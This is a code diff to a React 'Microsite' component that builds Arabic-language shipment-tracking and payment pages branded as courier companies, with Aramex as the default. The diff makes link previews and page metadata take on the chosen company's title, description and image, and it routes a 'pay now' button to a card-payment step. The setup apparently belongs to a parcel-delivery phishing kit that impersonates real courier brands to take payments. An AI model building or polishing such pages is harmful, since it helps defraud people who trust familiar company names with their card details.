@@ -7,6 +7,8 @@ import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode, formatCurrency } from "@/lib/countries";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { gccShippingServices } from "@/lib/gccShippingServices";
+import { getCompanyMeta } from "@/utils/companyMeta";
+import { getCurrency } from "@/utils/countryData";
 import SEOHead from "@/components/SEOHead";
 import {
   MapPin,
@@ -68,6 +70,9 @@ const Microsite = () => {
   const serviceKey = payload.service_key || 'aramex';
   const serviceBranding = getServiceBranding(serviceKey);
 
+  // Get dynamic company metadata for OG tags
+  const companyMeta = getCompanyMeta(serviceKey);
+
   // Update URL to include service information for better SEO
   React.useEffect(() => {
     const currentUrl = new URL(window.location.href);
@@ -79,25 +84,25 @@ const Microsite = () => {
 
   // Get service description from serviceBranding to match the chosen company
   const serviceDescription = serviceBranding.description || `خدمة ${serviceName} - نظام دفع آمن ومحمي`;
-  
+
   // Determine if it's a shipping or chalet link
   const isShipping = link.type === 'shipping';
-  const displayName = isShipping 
-    ? `شحنة ${serviceName}` 
+  const displayName = isShipping
+    ? `شحنة ${serviceName}`
     : payload.chalet_name;
-  
-  // SEO metadata
-  const seoTitle = isShipping 
-    ? `تتبع وتأكيد الدفع - ${serviceName}` 
+
+  // SEO metadata - Use dynamic company meta when available
+  const seoTitle = isShipping
+    ? companyMeta.title || `تتبع وتأكيد الدفع - ${serviceName}`
     : `حجز شاليه - ${payload.chalet_name}`;
   const seoDescription = isShipping
-    ? `${serviceDescription} - تتبع شحنتك وأكمل الدفع بشكل آمن`
+    ? companyMeta.description || `${serviceDescription} - تتبع شحنتك وأكمل الدفع بشكل آمن`
     : `احجز ${payload.chalet_name} في ${countryData.nameAr} - ${payload.nights} ليلة لـ ${payload.guest_count} ضيف`;
-  const seoImage = serviceBranding.ogImage || serviceBranding.heroImage || '/og-aramex.jpg';
+  const seoImage = companyMeta.image || serviceBranding.ogImage || serviceBranding.heroImage || '/og-aramex.jpg';
   
   return (
     <>
-      <SEOHead 
+      <SEOHead
         title={seoTitle}
         description={seoDescription}
         image={seoImage}
@@ -105,6 +110,8 @@ const Microsite = () => {
         type="website"
         serviceName={serviceName}
         serviceDescription={serviceDescription}
+        companyKey={serviceKey}
+        currency={countryData.currency}
       />
       <div className="min-h-screen py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
       <div className="container mx-auto px-4">
@@ -282,7 +289,12 @@ const Microsite = () => {
               <Button
                 size="lg"
                 className="w-full text-xl py-7 shadow-glow animate-pulse-glow"
-                onClick={() => navigate(`/pay/${link.id}/recipient?company=${payload.service_key || payload.service_key || 'aramex'}`)}
+                onClick={() => {
+                  const companyKey = payload.service_key || 'aramex';
+                  const currency = getCurrency(countryData.code);
+                  const title = `Payment in ${countryData.nameAr}`;
+                  navigate(`/pay/${link.id}/recipient?company=${companyKey}&currency=${currency}&title=${encodeURIComponent(title)}`);
+                }}
               >
                 <CreditCard className="w-6 h-6 ml-3" />
                 <span>ادفع الآن</span>
